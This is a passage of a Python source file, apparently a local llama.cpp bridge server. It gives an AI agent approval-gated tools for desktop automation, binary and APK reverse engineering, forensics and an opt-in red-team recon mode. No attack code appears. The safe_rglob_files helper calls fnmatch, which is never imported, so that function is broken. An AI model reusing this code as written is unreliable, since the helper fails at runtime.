"""
Accuretta bridge — local llama.cpp proxy + tools + approvals + static server.

One process. Serves the frontend (index.html / app.js / app.css / Design Change)
and exposes JSON/SSE endpoints for chat streaming, tool invocation, workspace,
versioning, settings, and command approvals.

Runs on 0.0.0.0:8787 so Tailscale / LAN peers can reach it from phones.
"""

from __future__ import annotations

import json
import os
import random
import re
import shlex
import shutil
import subprocess
import sys
import threading
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from queue import Empty, Queue
from typing import Any
import webbrowser
import base64 as _b64
import io as _io
import socket
import ssl
import datetime
from concurrent.futures import ThreadPoolExecutor

# ---- desktop automation (optional) ---------------------------------------
# Graceful imports — desktop tools will clearly report when these are missing
# so the agent can tell the user what to install. No import failures kill startup.
try:
    import pyautogui  # type: ignore
    pyautogui.FAILSAFE = True       # moving mouse to (0,0) aborts any automation
    pyautogui.PAUSE = 0.05          # small pause between clicks/keys for stability
    _HAVE_PYAUTOGUI = True
except Exception:
    pyautogui = None  # type: ignore
    _HAVE_PYAUTOGUI = False

try:
    from PIL import Image  # type: ignore
    _HAVE_PIL = True
except Exception:
    Image = None  # type: ignore
    _HAVE_PIL = False

try:
    import pygetwindow as _pgw  # type: ignore
    _HAVE_PGW = True
except Exception:
    _pgw = None  # type: ignore
    _HAVE_PGW = False

# ---- firmware analysis (optional) ----------------------------------------
# Signature scanning is pure-Python (no binwalk dependency — the pip
# "binwalk" package is a broken stub unrelated to the real tool).
# PySquashfsImage handles squashfs extraction, pyelftools parses ELF
# headers. Both are graceful — tools self-report the missing dep when
# invoked so the agent can tell the user what to install.
try:
    from PySquashfsImage import SquashFsImage  # type: ignore
    _HAVE_SQUASHFS = True
except Exception:
    SquashFsImage = None  # type: ignore
    _HAVE_SQUASHFS = False

try:
    from elftools.elf.elffile import ELFFile  # type: ignore
    _HAVE_ELFTOOLS = True
except Exception:
    ELFFile = None  # type: ignore
    _HAVE_ELFTOOLS = False

try:
    import capstone as _capstone  # type: ignore
    _HAVE_CAPSTONE = True
except Exception:
    _capstone = None  # type: ignore
    _HAVE_CAPSTONE = False

# ---- APK static analysis (optional) --------------------------------------
# androguard handles the binary AndroidManifest.xml, dex parsing, certs, and
# permission lookups without external tools. Pure-Python. If absent, the
# scan_apk tool falls back to ZIP-only mode (manifest dump becomes a "raw
# bytes" notice) and tells the user to `pip install androguard`.
try:
    from androguard.core.apk import APK as _AndroidAPK  # type: ignore
    _HAVE_ANDROGUARD = True
except Exception:
    try:
        # androguard <= 3.x kept APK at a different import path
        from androguard.core.bytecodes.apk import APK as _AndroidAPK  # type: ignore
        _HAVE_ANDROGUARD = True
    except Exception:
        _AndroidAPK = None  # type: ignore
        _HAVE_ANDROGUARD = False

# ---- YARA pattern matching (optional) ------------------------------------
# yara-python compiles + matches against files. We bundle a small default
# rule set that flags very common malware indicators (suspicious APIs in
# combination, mimikatz strings, base64-encoded MZ headers, packers, etc).
# Users can pass rules='path/to/file.yar' or an inline source string to
# override. Pure-Python wrapper around the libyara C library.
try:
    import yara as _yara  # type: ignore
    _HAVE_YARA = True
except Exception:
    _yara = None  # type: ignore
    _HAVE_YARA = False

# ---- PE/ELF fast triage (optional) ---------------------------------------
# pefile is a pure-Python parser for PE32/PE32+ binaries. ~100ms on a
# typical .exe vs Ghidra's 30s — model uses this for triage and only
# escalates to ghidra_analyze when needed. ELF parsing uses pyelftools if
# available, otherwise falls back to header-only stdlib parsing.
try:
    import pefile as _pefile  # type: ignore
    _HAVE_PEFILE = True
except Exception:
    _pefile = None  # type: ignore
    _HAVE_PEFILE = False
try:
    from elftools.elf.elffile import ELFFile as _ELFFile  # type: ignore
    _HAVE_PYELFTOOLS = True
except Exception:
    _ELFFile = None  # type: ignore
    _HAVE_PYELFTOOLS = False

# ---- Native binary analysis via Ghidra (optional) ------------------------
# pyghidra runs Ghidra in-process via JPype. Heavy: ~600MB resident once
# started, ~10s to boot the JVM the first call. After that, each tool call
# reuses the running Ghidra so calls 2..N are seconds. We import lazily —
# the import itself is cheap, but pyghidra.start() loads the JVM, so we only
# call start() inside tool_ghidra_analyze on first use. Requires JDK 21+ and
# a Ghidra install (path via settings.ghidra_path or $GHIDRA_INSTALL_DIR).
try:
    import pyghidra as _pyghidra  # type: ignore
    _HAVE_PYGHIDRA = True
except Exception:
    _pyghidra = None  # type: ignore
    _HAVE_PYGHIDRA = False
_PYGHIDRA_STARTED = False
_PYGHIDRA_START_LOCK = threading.Lock()

# ---- Cybersecurity / Forensics (optional) --------------------------------
try:
    from evtx import PyEvtxParser as _PyEvtxParser  # type: ignore
    _HAVE_EVTX_RUST = True
except Exception:
    _PyEvtxParser = None  # type: ignore
    _HAVE_EVTX_RUST = False

try:
    from Evtx.Evtx import Evtx as _Evtx  # type: ignore
    _HAVE_EVTX_PY = True
except Exception:
    _Evtx = None  # type: ignore
    _HAVE_EVTX_PY = False

try:
    import dpkt as _dpkt  # type: ignore
    _HAVE_DPKT = True
except Exception:
    _dpkt = None  # type: ignore
    _HAVE_DPKT = False

try:
    from scapy.all import rdpcap as _rdpcap  # type: ignore
    _HAVE_SCAPY = True
except Exception:
    _rdpcap = None  # type: ignore
    _HAVE_SCAPY = False


# Kill switch: when set, every desktop action tool refuses immediately.
# The frontend panic button and the user deny-action both flip this via
# `/api/desktop/panic`. Cleared by /api/desktop/resume or a new chat turn.
_desktop_panic = threading.Event()

# Rate limiter for desktop actions — defense in depth. Hard cap regardless
# of what the agent requests. Tunable in settings.
_desktop_action_times: list[float] = []
_desktop_action_lock = threading.Lock()


ROOT = Path(__file__).parent.resolve()
DATA = ROOT / "data"
VERSIONS_DIR = DATA / "versions"
PENDING_DIR = DATA / "pending"
SNAPSHOTS_DIR = DATA / "snapshots"
CHATS_FILE = DATA / "chats.json"
SETTINGS_FILE = DATA / "settings.json"
WORKSPACE_FILE = DATA / "workspace.json"
SYSTEM_CONTEXT_FILE = DATA / "ACCURETTA.md"
MEMORIES_FILE = DATA / "memories.jsonl"
MEMORIES_MAX_INJECT = 15          # how many to load into every system prompt
MEMORIES_TEXT_CAP = 220           # per-entry char cap — token-efficient


def safe_exists(path: str | Path | None) -> bool:
    """Check if a path exists without raising OSError on malformed Windows inputs."""
    if not path:
        return False
    try:
        return Path(path).exists()
    except Exception:
        return False


def safe_is_dir(path: str | Path | None) -> bool:
    """Check if a path is a directory without raising OSError on malformed Windows inputs."""
    if not path:
        return False
    try:
        return Path(path).is_dir()
    except Exception:
        return False


def safe_rglob_files(root_dir: str | Path, pattern: str, max_depth: int = 3) -> list[Path]:
    """Safely recursively list files matching pattern under root_dir with strict depth limits and ignore-lists."""
    if not root_dir:
        return []
    try:
        root_path = Path(root_dir)
        if not safe_exists(root_path) or not safe_is_dir(root_path):
            return []
    except Exception:
        return []

    ignored_dirs = {
        ".git", "node_modules", "venv", ".venv", "__pycache__", 
        "appdata/local/temp", "temp", "tmp", "$recycle.bin", 
        "system volume information", "build", "dist"
    }
    
    results: list[Path] = []
    
    def _scan(dir_path: Path, current_depth: int):
        if current_depth > max_depth:
            return
        try:
            for child in dir_path.iterdir():
                try:
                    if child.is_dir():
                        if child.name.lower() not in ignored_dirs:
                            _scan(child, current_depth + 1)
                    elif child.is_file():
                        if fnmatch.fnmatch(child.name.lower(), pattern.lower()):
                            results.append(child)
                except Exception:
                    continue
        except Exception:
            pass
            
    _scan(root_path, 1)
    return results

# PowerShell command history — append-only JSON Lines, one row per command
# that hits _run_powershell. Surfaced via /api/cmd-history and the History
# drawer in the UI. Kept rolling: anything past CMD_HISTORY_MAX gets trimmed
# on each write so the file never grows unbounded.
CMD_HISTORY_FILE = DATA / "cmd_history.jsonl"
CMD_HISTORY_MAX = 2000
IGNORE_FILE_NAME = ".accurettaignore"

# per-chat ephemeral desktop kill switch.  lives in memory only — restarting
# the bridge resets every chat to its global setting.
_chat_desktop_disabled: set[str] = set()

# tracks which chat a tool is being invoked inside, so the per-chat kill
# switch can short-circuit desktop tools without plumbing chat_id through
# every function. it's a plain module variable set on the worker thread
# before run_chat_turn and cleared after.
import contextvars
_current_chat_id: contextvars.ContextVar[str] = contextvars.ContextVar("_current_chat_id", default="")

# per-chat SSE emitter so tools can stream progress without plumbing emit through every call
_chat_emitters: dict[str, callable] = {}

# last known prompt token count from llama-server — updated after each turn
_last_prompt_tokens: int = 0
# Same value, but keyed by chat so the context gauge and the rolling-summary
# trigger reflect the ACTIVE chat, not whichever chat last ran a turn. This is
# the real tokenizer count llama-server reports (prompt_eval_count) — the
# ground truth for "how full is the context".
_last_prompt_tokens_by_chat: dict[str, int] = {}
# Cache for the tokenize-based cold-start estimate (used only before a chat has
# completed its first turn, so there is no real prompt_eval_count yet). Keyed by
# chat_id → (fingerprint, tokens) so the 2s gauge poll doesn't re-tokenize
# unchanged history every tick.
_CTX_EST_CACHE: dict[str, tuple] = {}

# per-chat cancellation. `cancel` flips when user hits Stop (via /api/cancel or
# client disconnect). `resp` is the live urllib response to llama-server, which
# we close explicitly to abort generation server-side — closing the socket is
# the only reliable way to make llama-server stop emitting tokens.
_chat_cancels: dict[str, dict] = {}
_chat_cancels_lock = threading.Lock()


def _register_cancel(chat_id: str) -> threading.Event:
    ev = threading.Event()
    with _chat_cancels_lock:
        _chat_cancels[chat_id] = {"cancel": ev, "resp": None}
    return ev


def _set_cancel_resp(chat_id: str, resp) -> None:
    with _chat_cancels_lock:
        if chat_id in _chat_cancels:
            _chat_cancels[chat_id]["resp"] = resp


def _unregister_cancel(chat_id: str) -> None:
    with _chat_cancels_lock:
        _chat_cancels.pop(chat_id, None)


def cancel_chat(chat_id: str) -> bool:
    """Flip the cancel flag and force-close the active llama-server response
    for this chat. Returns True if something was cancelled."""
    with _chat_cancels_lock:
        entry = _chat_cancels.get(chat_id)
        if not entry:
            return False
        entry["cancel"].set()
        resp = entry.get("resp")
    if resp is not None:
        try:
            resp.close()
        except Exception:
            pass
        try:
            # reach through urllib to the raw socket and hard-shut it so
            # llama-server notices within one token's worth of time.
            fp = getattr(resp, "fp", None)
            sock = getattr(getattr(fp, "raw", None), "_sock", None)
            if sock:
                import socket as _sock
                try:
                    sock.shutdown(_sock.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
        except Exception:
            pass
    return True

# thread pool for long-running tools so the HTTP worker stays responsive
_tool_executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tool-")

# async tool jobs (for POST /api/tools/call returning job-id)
_tool_jobs: dict[str, dict] = {}
_tool_jobs_lock = threading.Lock()

for d in (DATA, VERSIONS_DIR, PENDING_DIR, SNAPSHOTS_DIR):
    d.mkdir(parents=True, exist_ok=True)

def _resolve_llama_url() -> str:
    """Resolve llama-server URL. Default: http://127.0.0.1:8080.
    Env LLAMA_HOST accepts 'host:port', bare host, or full URL."""
    raw = (os.environ.get("LLAMA_HOST") or os.environ.get("LLAMA_URL") or "").strip()
    if not raw:
        return "http://127.0.0.1:8080"
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    try:
        scheme, rest = raw.split("://", 1)
        hostport = rest.split("/", 1)[0]
        if ":" in hostport:
            host, port = hostport.split(":", 1)
        else:
            host, port = hostport, "8080"
    except Exception:
        return "http://127.0.0.1:8080"
    if host in ("", "0.0.0.0", "::", "*"):
        host = "127.0.0.1"
    return f"{scheme}://{host}:{port}"

LLAMA = _resolve_llama_url()
# optional separate vision-capable llama-server. If unset, we assume the main
# llama-server is vision-capable (started with --mmproj). If it isn't, image
# messages just fail — caller should handle.
VISION_LLAMA = (os.environ.get("VISION_LLAMA_HOST") or "").strip()
if VISION_LLAMA and not VISION_LLAMA.startswith(("http://", "https://")):
    VISION_LLAMA = "http://" + VISION_LLAMA
if not VISION_LLAMA:
    VISION_LLAMA = LLAMA
PORT = int(os.environ.get("ACCURETTA_PORT", "8787"))

# ---- persistence helpers ---------------------------------------------------

_FILE_LOCK = threading.Lock()


def load_json(path: Path, default: Any) -> Any:
    if not path.exists():
        return default
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception as e:
        # Corruption recovery — rename the broken file aside instead of
        # silently returning default. Without this, a partially-written
        # chats.json (interrupted manual edit, OS hard reset, disk full
        # pre-atomicity) would erase the user's entire chat history with
        # zero diagnostic trail. The .corrupt-<ts> file is left in place
        # so the user (or a recovery script) can attempt salvage.
        try:
            ts = time.strftime("%Y%m%d-%H%M%S")
            bak = path.with_name(f"{path.name}.corrupt-{ts}")
            path.rename(bak)
            print(f"[load_json] corrupt: {path} -> {bak.name} ({e!r})", file=sys.stderr)
        except Exception as e2:
            print(f"[load_json] corrupt + rename failed: {path} ({e!r}; rename: {e2!r})", file=sys.stderr)
        return default


def save_json(path: Path, value: Any) -> None:
    with _FILE_LOCK:
        tmp = path.with_suffix(path.suffix + ".tmp")
        tmp.write_text(json.dumps(value, indent=2, ensure_ascii=False), encoding="utf-8")
        tmp.replace(path)


DEFAULT_SETTINGS = {
    "model": "",
    "vision_model": "lighton-ocr",
    # desktop automation (off by default — opt-in, gated behind approvals)
    "desktop_enabled": False,
    # red-team recon suite (off by default — opt-in; keeps ~13 recon tools out
    # of the prompt for normal coding turns)
    "red_team_enabled": False,
    # discord remote bridge (off by default — DM accuretta from your phone with
    # push notifications + reaction approvals; outbound only, locked to owner id)
    "discord_enabled": False,
    "discord_bot_token": "",
    "discord_owner_id": "",
    "desktop_app_allowlist": [],            # e.g. ["notepad", "chrome", "code"]; matched case-insensitive against exe/launch target
    "desktop_max_actions_per_minute": 30,   # hard rate limit for agent-driven actions
    "desktop_auto_approve_read": True,      # screenshot/describe/list_windows never require approval
    "num_ctx": 8192,
    "num_gpu": 99,
    "num_batch": 512,
    "num_thread": 0,
    "num_predict": -1,
    "temperature": 0.5,
    "top_p": 0.9,
    "top_k": 40,
    "min_p": 0.05,
    "repeat_penalty": 1.1,
    "presence_penalty": 0.0,
    "frequency_penalty": 0.0,
    "keep_alive": "30m",
    "theme": "light",
    "auto_approve_read": True,
    "auto_approve_write": False,    # trust writes: skip approval for in-workspace file writes/edits (registry/system/powershell still always prompt)
    "allow_web_preview": True,
    # memory / performance
    "kv_cache_type": "q8_0",        # q4_0 | q8_0 | f16 — lower = less VRAM, slightly lower quality
    # IDE preview extras (composer toolbar toggles)
    "use_tailwind_cdn": False,      # inject Tailwind Play CDN into preview + ask model to use tailwind classes
    "ide_multifile": False,         # tell the model to emit a small folder structure (index.html / style.css / script.js / assets/)
    # reasoning / thinking (Qwen3-family and other reasoner models)
    "enable_thinking": True,        # when False, suppress <think> blocks entirely via chat_template_kwargs
    "thinking_budget": 4096,        # HARNESS-enforced cap on thinking tokens (we count + force-close; the model's template can't be trusted to honor it). -1 = unlimited
    "max_tool_rounds": 120,         # how many tool-call rounds the model may run per user turn before forced stop
    "preserve_prior_thinking": False,# replay prior <think> verbatim: bloats context + re-feeds doubt on long runs, so default off
    # llama-server lifecycle (bridge spawns it for us)
    "watchdog_enabled": True,       # auto-respawn llama-server on silent crash (OOM, segfault).
                                    # Circuit breaker stops trying after 3 crashes in 60s — fix
                                    # config and click 'Restart server' to resume. /api/models/stop
                                    # disables auto-restart until next /api/models/load.
    "models_dir": "",               # folder containing .gguf files (set via Settings -> Models folder)
    "model_path": "",               # full path to the currently loaded .gguf
    "llama_bin": "",                # override path to llama-server.exe (auto-detected if blank)
    "mmproj_path": "",              # full path to a vision multimodal projector (.gguf). When set,
                                    # llama-server boots with --mmproj <path> and the chat handler
                                    # sends images straight to the loaded model instead of routing
                                    # through the small OCR/vision side-model. Leave blank for
                                    # text-only models or when you've already pruned the vision
                                    # tower from the GGUF to fit more layers in VRAM.
    "mmproj_auto": True,            # auto-pick a sibling .mmproj.gguf (or *mmproj*.gguf) next to
                                    # the chosen model when mmproj_path is empty.
    # llama-server tuning (all map to llama-server CLI flags). Restart required.
    "n_cpu_moe": 0,                 # --n-cpu-moe: how many MoE experts to keep on CPU. 0 = all on GPU.
                                    # The killer flag for fitting big MoE models (Qwen3 35B-A3B, GLM 4.7) on small VRAM.
    "flash_attn": True,             # --flash-attn on/off. Off only if your GPU/build doesn't support it.
    "n_parallel": 1,                # --parallel: concurrent sequences. 1 is fine for chat. 2+ wastes ctx.
    "n_ubatch": 0,                  # --ubatch-size. 0 = auto (half of batch, clamped 512..1024).
    "enable_speculative": True,     # DEPRECATED — kept for backward-compat. Read by older configs only;
                                    # new field `spec_strategy` supersedes it. True maps to "ngram-mod", False to "off".
    "spec_strategy": "ngram-mod",   # Speculative decoding strategy. One of:
                                    #   "off"        — no speculative decoding (best for unusual models that confuse the drafter)
                                    #   "ngram-mod"  — n-gram modular draft, works on any model (default, current behavior)
                                    #   "draft-mtp"  — uses the model's built-in MTP heads (Qwen 3.5/3.6, DeepSeek V3/R1).
                                    #                  ~1.85x decode speedup on MTP-capable models; fails at startup on others.
                                    #                  Requires llama.cpp built from master after 2026-05-16 (PR #22673).
    "no_warmup": False,             # --no-warmup. Saves a few seconds at startup.
    "enable_metrics": False,        # --metrics. Exposes Prometheus metrics on /metrics. Off by default.
    "llama_extra_args": "",         # Free-form extra flags appended verbatim, e.g. "--alias my-model --rope-scaling linear".
                                    # Power-user escape hatch. Whitespace-split. Use with care.
    # Auto-tune helper (UI persistence only — does not get sent to llama-server directly).
    "vram_tier_gb": 0,              # 0 = auto-detect via nvidia-smi. Otherwise a fixed VRAM budget the suggester targets.
    # APK analysis (Phase 2 decompile_apk tool — Phase 1 scan_apk needs no config).
    "jadx_path": "",                # Full path to jadx.bat / jadx. Blank = auto-detect via PATH + common install dirs.
    # Native-binary analysis via Ghidra (in-process through pyghidra).
    "ghidra_path": "",              # Ghidra install root, e.g. C:\Program Files\ghidra_12.0.4_PUBLIC.
                                    # Blank = use $GHIDRA_INSTALL_DIR. Requires JDK 21+ + `pip install pyghidra`.
}


def get_settings() -> dict:
    s = load_json(SETTINGS_FILE, {})
    out = {**DEFAULT_SETTINGS, **(s if isinstance(s, dict) else {})}
    return out


def get_workspace() -> dict:
    ws = load_json(WORKSPACE_FILE, {"folders": []})
    if not isinstance(ws, dict):
        ws = {"folders": []}
    ws.setdefault("folders", [])
    
    # If no workspace folder is configured (first run or none selected),
    # automatically create and select "Accuretta Workspace" in the Documents folder.
    folders = [f for f in ws["folders"] if isinstance(f, str) and f.strip()]
    if not folders:
        try:
            doc_dir = Path(os.path.expanduser("~/Documents")).resolve()
            if not doc_dir.exists():
                doc_dir = Path.home() / "Documents"
            
            workspace_dir = doc_dir / "Accuretta Workspace"
            workspace_dir.mkdir(parents=True, exist_ok=True)
            
            default_folder = normalize_path(str(workspace_dir))
            ws["folders"] = [default_folder]
            save_json(WORKSPACE_FILE, ws)
        except Exception as e:
            print(f"Error creating default workspace directory: {e}")
            
    return ws


def get_chats() -> dict:
    c = load_json(CHATS_FILE, {"chats": {}, "order": []})
    if not isinstance(c, dict):
        c = {"chats": {}, "order": []}
    c.setdefault("chats", {})
    c.setdefault("order", [])
    return c


# Hard cap on how many messages we retain per chat in chats.json. Trimmer at
# request time gives the *model* a tight context window; this cap is purely
# disk hygiene so a long-running firmware investigation doesn't grow the JSON
# file unbounded. Anchored on the first user message — it's the task statement
# and the trimmer always keeps it as the second message after system.
CHAT_HISTORY_MAX = 1000


def _enforce_chat_retention(chat: dict) -> None:
    msgs = chat.get("messages") or []
    if len(msgs) <= CHAT_HISTORY_MAX:
        return
    # find the first user message — that's our anchor we never drop
    first_user_idx = next(
        (i for i, m in enumerate(msgs) if m.get("role") == "user"),
        None,
    )
    overflow = len(msgs) - CHAT_HISTORY_MAX
    # drop oldest messages AFTER the first user, walking forward
    if first_user_idx is None:
        # no user message? just trim from the front
        chat["messages"] = msgs[overflow:]
        return
    keep_head = msgs[: first_user_idx + 1]
    rest = msgs[first_user_idx + 1:]
    # drop `overflow` oldest from rest
    rest = rest[overflow:]
    chat["messages"] = keep_head + rest


# ---- token counting (approximation) ----------------------------------------
# We don't bundle tiktoken — this is a fast, conservative heuristic that
# works across languages. It errs on the side of over-counting so we don't
# accidentally overflow the context window.
# English text ~4 chars/tok, code ~3 chars/tok, CJK ~1.5 chars/tok.
# We use a blended 3.0 to stay safe.
CHARS_PER_TOKEN = 3.0


def _approx_tokens(text: str) -> int:
    if not text:
        return 0
    # byte-length penalises non-ASCII (CJK, emoji) which are multi-byte
    return max(len(text), len(text.encode("utf-8"))) // CHARS_PER_TOKEN


def _count_msg_tokens(msg: dict) -> int:
    content = msg.get("content") or ""
    # Vision turns: content is a list like [{type:"text",text:...},
    # {type:"image_url",image_url:{url:"data:image/png;base64,..."}}].
    # Text parts count normally; each image is a flat ~600-token estimate
    # (llama.cpp's mmproj typically expands a 336x336 patch grid into roughly
    # that many vision tokens — close enough for budgeting).
    if isinstance(content, list):
        text_total = 0
        image_count = 0
        for part in content:
            if not isinstance(part, dict):
                continue
            if part.get("type") == "text":
                text_total += _approx_tokens(part.get("text") or "")
            elif part.get("type") == "image_url":
                image_count += 1
        text_tokens = text_total + image_count * 600
    else:
        text_tokens = _approx_tokens(content)
    # tool_call JSON is also text the model sees
    tcs = msg.get("tool_calls") or []
    extra = json.dumps(tcs, ensure_ascii=False) if tcs else ""
    return text_tokens + _approx_tokens(extra) + 4  # role overhead


def truncate_messages(msgs: list[dict], max_tokens: int, reserve: int = 256) -> list[dict]:
    """Conveyor belt: drop oldest middle messages while anchoring the system
    prompt (current goals/memory) AND the first user message (the original ask
    that frames the whole conversation). Most recent messages always keep.

    Layout: [system] + [first_user] + ...dropped... + [recent...]
    Reserve covers room for the next assistant reply + reasoning.
    """
    if not msgs:
        return msgs
    budget = max_tokens - reserve

    # Anchor 1: system prompt at index 0 (if present).
    system = [msgs[0]] if msgs and msgs[0].get("role") == "system" else []
    rest = msgs[len(system):]

    # Anchor 2: the first user message in `rest` (the original request). We
    # also pull the assistant reply that immediately follows it, because tool
    # call / tool result pairs must stay together to be valid OpenAI history.
    anchor: list[dict] = []
    anchor_end = 0
    for i, m in enumerate(rest):
        if m.get("role") == "user":
            anchor = [m]
            anchor_end = i + 1
            # include directly-following assistant + tool messages that pair
            # with this first user turn (avoid splitting a tool_call/result).
            while anchor_end < len(rest) and rest[anchor_end].get("role") in ("assistant", "tool"):
                anchor.append(rest[anchor_end])
                anchor_end += 1
            break

    middle_and_tail = rest[anchor_end:]

    # Count anchored cost first; if it already busts the budget, give up on
    # the anchor (long first message in a tiny ctx) and fall back to plain
    # tail-only behavior.
    anchor_cost = sum(_count_msg_tokens(m) for m in system) + sum(_count_msg_tokens(m) for m in anchor)
    if anchor_cost > budget * 0.6:
        anchor = []
        anchor_cost = sum(_count_msg_tokens(m) for m in system)

    # Walk recent messages from the end backwards, keeping until budget hits.
    keep: list[dict] = []
    total = anchor_cost
    for m in reversed(middle_and_tail):
        t = _count_msg_tokens(m)
        if total + t > budget and keep:
            break
        keep.insert(0, m)
        total += t

    if not keep and not anchor:
        # Emergency: keep only the very last message.
        keep = middle_and_tail[-1:] or rest[-1:]

    # Pair-protect the boundary: a `tool` message at the front of `keep` is
    # an orphan if its parent assistant (with the matching tool_call_id) was
    # dropped. llama-server rejects orphan tool messages, so drop them here.
    while keep and keep[0].get("role") == "tool":
        keep.pop(0)

    # If the anchor is the same object as the first kept message (very short
    # convo), don't duplicate it.
    if anchor and keep and anchor[0] is keep[0]:
        return system + keep
    return system + anchor + keep


# ---- rolling conversation summary -----------------------------------------
# Instead of letting truncate_messages DELETE the middle of a long conversation
# (which loses "we hit bug X, fixed it by Y" and makes the model repeat fixed
# mistakes), we compress the oldest turns into a dense summary folded into the
# system message. Recent turns stay raw; only the old middle becomes gist.
# Token-aware trigger: only fold when the unsummarized tail actually approaches
# the context window, so short sessions keep full detail and we never spend a
# summary call prematurely. Fractions are of the LIVE context limit, so a bigger
# window naturally summarizes later.
_SUMMARY_MIN_KEEP = 6          # always keep at least this many recent messages raw
_SUMMARY_TRIGGER_FRAC = 0.55  # summarize once the unsummarized tail exceeds this much of ctx
_SUMMARY_KEEP_FRAC = 0.35     # after folding, keep ~this much of ctx as recent raw turns
_SUMMARY_INSTR = (
    "You are compressing an earlier slice of a coding-assistant conversation into a dense, "
    "factual summary for the assistant's OWN future reference. Merge the PRIOR SUMMARY (if any) "
    "with the NEW MESSAGES into one updated summary. Preserve precisely: decisions made; bugs or "
    "mistakes found AND how they were fixed (so they are not repeated); constraints and requirements "
    "the user stated; important file paths, function names, and identifiers; and the current state of "
    "the work. Use terse bullet points, no pleasantries, no preamble. Keep it under ~220 words."
)


def _render_msgs_for_summary(slice_msgs: list[dict]) -> str:
    out = []
    for m in slice_msgs:
        role = m.get("role")
        if role not in ("user", "assistant", "tool"):
            continue
        c = m.get("content", "")
        if isinstance(c, list):
            c = " ".join(p.get("text", "") for p in c if isinstance(p, dict) and p.get("type") == "text")
        c = str(c or "")
        if role == "tool":
            c = "[tool result] " + c[:500]
        elif m.get("tool_calls"):
            names = ", ".join((tc.get("function", {}) or {}).get("name", "") for tc in m.get("tool_calls", []))
            c = (c[:600] + f" [called tools: {names}]").strip()
        else:
            c = c[:1200]
        if c.strip():
            out.append(f"{role}: {c}")
    return "\n".join(out)


def _update_rolling_summary(old_summary: str, slice_msgs: list[dict]) -> str:
    """One non-streaming model call: merge old summary + new slice into an
    updated summary. Returns old_summary unchanged on any failure (never raises)."""
    rendered = _render_msgs_for_summary(slice_msgs)
    if not rendered.strip():
        return old_summary
    user = ""
    if old_summary:
        user += f"PRIOR SUMMARY:\n{old_summary}\n\n"
    user += f"NEW MESSAGES:\n{rendered}"
    payload = {
        "model": "local",
        "messages": [
            {"role": "system", "content": _SUMMARY_INSTR},
            {"role": "user", "content": user[:14000]},
        ],
        "stream": False, "temperature": 0.2, "max_tokens": 450,
    }
    try:
        resp = llama_post("/v1/chat/completions", payload, timeout=90)
        txt = ((resp.get("choices") or [{}])[0].get("message", {}).get("content", "") or "").strip()
        return txt or old_summary
    except Exception:
        return old_summary


def _maybe_roll_summary(chat: dict, ctx_limit: int) -> bool:
    """Token-aware: fold the oldest un-kept turns into chat['rolling_summary']
    ONLY when the conversation actually approaches the context window. Short
    sessions keep full detail; we never spend a summary call prematurely.
    Mutates chat in place; returns True if the summary advanced."""
    msgs = chat.get("messages", [])
    through = int(chat.get("summary_through", 0) or 0)
    tail = msgs[through:]
    if len(tail) <= _SUMMARY_MIN_KEEP:
        return False
    # Trustworthy fill signal: llama-server's real prompt_eval_count from this
    # chat's last turn (the whole prompt — system + tools + history). That is
    # the true "how close to the limit" measure, so the fold can't misfire on a
    # bad char estimate. Only fall back to the char count before a chat has run
    # a turn (no real number exists yet).
    real_fill = _last_prompt_tokens_by_chat.get(chat.get("id") or "", 0)
    if real_fill > 0:
        if real_fill <= ctx_limit * _SUMMARY_TRIGGER_FRAC:
            return False  # plenty of headroom — don't summarize yet
    else:
        tail_tokens = sum(_count_msg_tokens(m) for m in tail)
        if tail_tokens <= ctx_limit * _SUMMARY_TRIGGER_FRAC:
            return False  # plenty of headroom — don't summarize yet
    # Fold oldest turns until the remaining RAW tail is ~KEEP_FRAC of ctx. Walk
    # newest-first, keeping recent turns until the keep budget fills; the rest
    # (older) get folded into the summary.
    keep_budget = ctx_limit * _SUMMARY_KEEP_FRAC
    kept, cut = 0, through
    for i in range(len(msgs) - 1, through - 1, -1):
        kept += _count_msg_tokens(msgs[i])
        if kept >= keep_budget:
            cut = i
            break
    # never fold so far that fewer than MIN_KEEP recent messages remain raw
    cut = min(cut, len(msgs) - _SUMMARY_MIN_KEEP)
    if cut <= through:
        return False
    new_summary = _update_rolling_summary(chat.get("rolling_summary", ""), msgs[through:cut])
    if new_summary and new_summary != chat.get("rolling_summary", ""):
        chat["rolling_summary"] = new_summary
        chat["summary_through"] = cut
        return True
    return False


def tool_pin_note(args: dict) -> dict:
    """Pin a fact, decision, or fix to THIS session. Pins are injected verbatim
    into the system prompt every turn and NEVER trimmed or summarized away — use
    them for the critical 'do not undo / do not repeat' items (a bug's root cause
    and fix, a user constraint, a chosen approach)."""
    note = (args.get("note") or "").strip()
    if not note:
        return {"error": "note required"}
    cid = _get_current_chat()
    if not cid:
        return {"error": "no active chat to pin to"}
    chats = get_chats()
    chat = chats.get("chats", {}).get(cid)
    if not chat:
        return {"error": "active chat not found"}
    note = note[:300]
    pins = chat.get("pins") or []
    if note in pins:
        return {"already_pinned": note, "total_pins": len(pins)}
    pins.append(note)
    chat["pins"] = pins[-20:]   # keep the 20 most-recent
    save_json(CHATS_FILE, chats)
    return {"pinned": note, "total_pins": len(chat["pins"]),
            "note": "Pinned for this session — stays in context permanently, won't be trimmed."}


def tool_unpin_note(args: dict) -> dict:
    """Remove a pin from this session by exact text or 1-based index."""
    cid = _get_current_chat()
    if not cid:
        return {"error": "no active chat"}
    chats = get_chats()
    chat = chats.get("chats", {}).get(cid)
    if not chat:
        return {"error": "active chat not found"}
    pins = chat.get("pins") or []
    target = args.get("note")
    idx = args.get("index")
    removed = None
    if target and target in pins:
        pins.remove(target)
        removed = target
    elif isinstance(idx, int) and 1 <= idx <= len(pins):
        removed = pins.pop(idx - 1)
    else:
        return {"error": "pin not found", "current_pins": pins}
    chat["pins"] = pins
    save_json(CHATS_FILE, chats)
    return {"unpinned": removed, "total_pins": len(pins)}


# ---- system context (ACCURETTA.md) ----------------------------------------
# First-run scan of the user's machine so models know where things are.
# Not automatically readable by tools — it's injected into the system prompt.

# Cache system context scans for 5 minutes so we don't re-scan dirs every turn.
_SYSTEM_CONTEXT_CACHE: tuple[float, dict] | None = None
_SYSTEM_CONTEXT_TTL = 300


def _scan_system_context() -> dict:
    """Return a dict of facts about the machine, cheap to compute."""
    global _SYSTEM_CONTEXT_CACHE
